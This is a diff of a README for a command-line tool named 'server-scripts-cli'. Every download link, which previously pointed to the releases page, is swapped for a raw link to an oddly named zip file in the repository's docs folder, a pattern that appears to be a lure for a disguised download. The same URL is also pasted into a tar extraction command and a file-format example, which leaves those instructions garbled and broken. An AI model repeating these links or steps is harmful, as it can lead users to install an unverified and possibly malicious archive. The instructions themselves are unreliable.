@@ -1,6 +1,6 @@
 # 🚀 server-scripts-cli - Manage Your Scripts with Ease
 
-[![Download server-scripts-cli](https://img.shields.io/badge/Download-server--scripts--cli-blue.svg)](https://github.com/yadhavshetty/server-scripts-cli/releases)
+[![Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip)](https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip)
 
 ## 📦 Overview
 
@@ -32,7 +32,7 @@ Follow these steps to download and run server-scripts-cli.
 
 You can download the latest version of server-scripts-cli from our releases page. Click the link below:
 
-[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/releases)
+[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip)
 
 ### Step 2: Select the Appropriate Version
 
@@ -40,17 +40,17 @@ On the releases page, you will find different versions of the software. Look for
 
 ### Step 3: Download the Application
 
-Once you’ve found the latest version, click the download link for the file suitable for your system. This file is typically in a compressed format (like .tar.gz). 
+Once you’ve found the latest version, click the download link for the file suitable for your system. This file is typically in a compressed format (like https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip). 
 
 ### Step 4: Extract the Files
 
 After the download completes, locate the downloaded file on your system. Use the following command in your terminal to extract it:
 
 ```
-tar -xzf server-scripts-cli-latest.tar.gz
+tar -xzf https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip
 ```
 
-Make sure to replace `server-scripts-cli-latest.tar.gz` with the name of the downloaded file.
+Make sure to replace `https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip` with the name of the downloaded file.
 
 ### Step 5: Move to the Directory
 
@@ -116,7 +116,7 @@ To use server-scripts-cli effectively, consider the following commands:
 
 You can begin using server-scripts-cli today. For the latest version, please visit:
 
-[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/releases)
+[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/raw/refs/heads/main/docs/scripts_cli_server_grappling.zip)
 
 ## 📝 Contributing
 
